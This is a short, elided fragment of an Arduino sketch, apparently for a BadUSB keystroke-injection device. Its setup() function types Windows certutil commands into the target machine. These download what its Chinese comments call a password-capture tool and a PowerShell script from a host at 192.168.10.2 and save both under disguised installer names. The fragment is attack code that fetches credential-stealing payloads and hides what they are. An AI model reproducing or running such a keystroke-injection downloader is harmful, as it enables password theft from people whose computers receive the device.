...
void setup()
{
  ...
  delay(1000);
  Keyboard.println("certutil -urlcache -split -f http:192.168.10.2/KissGeek/PASSTOOLS.EXE d:\\setup_11.5.0.exe");//下载密码截取工具
  delay(10000);
  Keyboard.println("certutil -urlcache -split -f http:192.168.10.2/KissGeek/PassUp.PS1 d:\\setup_11.5.0.PS1");//下载powershell脚本
  delay(1000);
